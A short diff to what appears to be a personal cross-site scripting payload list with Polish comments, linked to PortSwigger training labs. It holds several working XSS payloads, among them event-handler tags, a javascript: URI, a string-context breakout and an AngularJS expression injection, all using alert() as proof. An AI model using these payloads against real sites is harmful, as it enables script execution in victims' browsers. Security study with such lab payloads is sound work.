@@ -1,4 +1,9 @@
 "><svg onload=alert(1)>
 <img src=1 onerror=alert(1)>
 javascript:alert('You are hacked!')
+
+[Wstrzykciecie w srodku zmiennej]
 '-alert(1)-'                          (https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded)
+
+[Podatnosc w angularze jezeli element jest objety app-ng no mozna wyonac kod]
+{{$on.constructor('alert(1)')()}}     (https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression)
